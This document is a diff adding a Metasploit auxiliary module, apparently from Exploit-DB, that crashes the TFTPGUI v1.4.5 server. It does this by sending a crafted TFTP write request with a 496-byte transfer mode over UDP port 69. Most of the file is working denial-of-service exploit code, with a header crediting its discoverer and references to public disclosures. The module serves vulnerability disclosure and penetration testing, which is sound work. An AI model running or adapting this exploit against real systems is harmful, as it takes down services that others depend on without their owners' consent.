@@ -1,0 +1,71 @@
+# Title: TFTPGUI v1.4.5 Long Transport Mode Overflow
+# EDB-ID: 12482
+# CVE-ID: ()
+# OSVDB-ID: ()
+# Author: Jeremiah Talamantes
+# Published: 2010-05-02
+# Verified: yes
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/ 
+##
+
+##
+#
+# TFTPGUI v1.4.5 Long Transport Mode Overflow
+#
+# Tested on: Windows XP, SP2 (EN)
+#
+# Date tested: 5/2/2010
+#
+#
+# |~Greetz to Devin @ infointox.net~|
+#
+# Discovered by: Jeremiah Talamantes
+# RedTeam Security
+# http://www.redteamsecure.com
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::Udp
+	include Msf::Auxiliary::Dos
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'TFTPGUI v1.4.5 Long Transport Mode Overflow',
+			'Description'    => %q{
+				The TFTPUtil GUI server version 1.4.5 can be
+				DOSed by sending a specially crafted request. Discovered by
+				Jeremiah Talamantes at RedTeam Security. 
+				Greetz to Devin @ infointox.net.
+			},
+			'Author'         => 'Jeremiah Talamantes (RedTeam Security)',
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: 9179 $',
+			'References'     =>
+				[ 
+					[ 'URL', 'http://www.redteamsecure.com/labs/post/37/redteam-discovers-0-day-in-tftpgui'], 
+					[ 'URL', 'http://www.exploit-db.com/exploits/12482'], 
+					[ 'URL', 'http://www.securityfocus.com/bid/39872'],
+				],
+			'DisclosureDate' => 'May 02 2010'))
+
+		register_options([Opt::RPORT(69)])
+	end
+
+	def run
+		connect_udp
+		print_status("Sending naughty request...")
+		$fn = "A"
+		$md = "A" * 496
+		$stuff = "\00\x02" + $fn + "\0" + $md + "\0"
+		udp_sock.put($stuff)		
+		disconnect_udp
+	end
+end
